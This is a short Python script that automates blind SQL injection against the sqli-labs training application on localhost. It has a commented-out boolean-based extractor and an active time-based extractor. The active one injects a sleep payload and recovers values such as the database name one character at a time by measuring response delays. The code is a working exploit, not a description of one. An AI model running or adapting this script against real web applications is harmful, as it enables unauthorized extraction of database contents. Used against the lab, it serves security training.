
#! /usr/bin/env/python
#-*-coding:utf-8-*-
import requests
from bs4 import BeautifulSoup
import time
chars = r'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@;\/:.'

#boolean blind sql injection
# def attack(target):
#     url = "http://localhost/sqlilabs/Less-8/?id=1%27%20and%20%20(select%20substr({0},{1},1))=%27{2}%27%23"
#     count = 1
#     result = ''
#     while(True):
#         result_tmp = result
#         for char in chars:
#             if char == '\\':
#                 char = '\\\\'
#             response = requests.get(url.format(target,count,char))
#             soup = BeautifulSoup(response.text,'lxml')
#             font = soup.select('font["size=5"]')[0]
#             if font.get_text()=='You are in...........':
#                 result+=char
#                 print result+'......'
#                 break
#         #判断是否结束
#         if result_tmp == result:
#             print u'脚本结束(结果不区分大小写)'
#             print result
#             break
#         count = count+1


#time blind sql injection
def time_blind(target):
    url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and if(substr({0},{1},1)='{2}',sleep(5),1)#"
    count = 1
    result = ''
    while (True):
        result_tmp = result
        for char in chars:
            start = time.time()
            if char == '\\':
                char = '\\\\'
            response = requests.get(url.format(target, count, char))
            if time.time()-start>=5:
                result += char
                print (result + '......')
                break
        # 判断是否结束
        if result_tmp == result:
            print(u'脚本结束(结果不区分大小写)')
            print(result)
            break
        count = count + 1

if __name__=='__main__':
    #attack('user()')
    time_blind('database()')
